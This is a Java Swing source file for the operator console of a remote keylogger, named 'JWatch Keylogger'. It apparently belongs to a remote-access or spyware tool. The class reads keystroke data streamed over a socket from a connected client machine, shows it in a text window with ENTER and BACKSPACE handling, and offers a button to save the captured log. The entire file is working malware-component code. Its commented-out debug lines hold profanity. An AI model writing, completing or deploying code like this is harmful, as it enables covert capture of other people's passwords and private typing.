import java.awt.BorderLayout;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;



//import java.awt.FlowLayout;
import javax.swing.JButton;
import javax.swing.JFrame;
//import javax.swing.JLabel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;


public class RemoteKeylogger extends Thread{

	private JTextArea textArea;
//	private JButton button;
//	private JLabel label;
	private JScrollPane scrollPane;
	private JButton saveFile;
	private ClientInfo requestedClient;
	private WindowAdapter windowEventClose;
	private JFrame logger;
	
	public RemoteKeylogger(ClientInfo requestedClient, WindowAdapter windowEventClose) {
		this.requestedClient = requestedClient;
		this.windowEventClose = windowEventClose;
		logger = new JFrame("JWatch Keylogger");
//		setLayout(new FlowLayout());
		textArea = new JTextArea(5, 30);
		scrollPane = new JScrollPane(textArea);
		 saveFile = new JButton("Save Logged Info");
		logger.add(saveFile, BorderLayout.SOUTH);
		logger.add(scrollPane, BorderLayout.CENTER);
		logger.addWindowListener(windowEventClose);
		logger.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		logger.setSize(400, 200);
		logger.setVisible(true);
//		setResizable(false);
		textArea.setEditable(false);
		textArea.setLineWrap(true);
		textArea.setWrapStyleWord(true);
//		textArea.append("fUCK YOU!");
//		textArea.append("fUCK YOU!wggsgsgagwggeg");
//		textArea.append("sgadsgadsgasdgdsgsdgasdgsdgsdg");
		
//		start();
	}
	
	@Override
	public void run() {
		try {
			BufferedReader readLog = new BufferedReader(new InputStreamReader(requestedClient.getSubSocketInfo("keylogger").getSocket().getInputStream()));
			String line;
			while((line = readLog.readLine()) != null) {
				if(line.equals("[ENTER]")) {
					textArea.append(System.getProperty("line.separator"));
				} else if(line.equals("[BACKSPACE]")) {
					if(textArea.getText().length() > 0)
						textArea.replaceRange("", textArea.getText().length() - 1, textArea.getText().length());
				} else {
					textArea.append(line);
				}
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {
		   logger.dispatchEvent(new WindowEvent(logger, WindowEvent.WINDOW_CLOSING));
		}
	}
//	public static void main(String args[]) {
//		RemoteKeylogger temp = new RemoteKeylogger();
//		temp.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
//		temp.setSize(400, 200);
//		temp.setVisible(true);
//		
//	}
//	
}
